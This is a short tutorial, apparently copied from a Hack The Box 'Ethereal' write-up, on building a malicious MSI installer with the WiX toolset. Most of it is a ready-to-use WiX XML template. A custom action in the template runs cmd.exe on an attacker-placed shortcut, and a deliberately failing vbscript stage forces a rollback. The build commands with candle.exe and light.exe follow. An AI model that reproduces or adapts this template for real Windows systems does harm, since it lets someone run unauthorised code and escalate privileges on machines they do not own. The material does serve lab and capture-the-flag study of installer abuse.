# Create MSI with WIX

**Tutorial copied from** [**https://0xrick.github.io/hack-the-box/ethereal/\#Creating-Malicious-msi-and-getting-root**](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)  
In order to create the msi we will use [wixtools](http://wixtoolset.org/) , you can use other msi builders but they didn’t work for me.  
Check [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) for some wix msi usage examples.  
We will create an msi that executes our lnk file :

```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```

 We will use `candle.exe` from wixtools to create a wixobject from `msi.xml`

```markup
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```

![](https://0xrick.github.io/images/hackthebox/ethereal/65.png)

Then we will use `light.exe` to create the msi file from the wixobject:

```markup
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```

![](https://0xrick.github.io/images/hackthebox/ethereal/66.png)

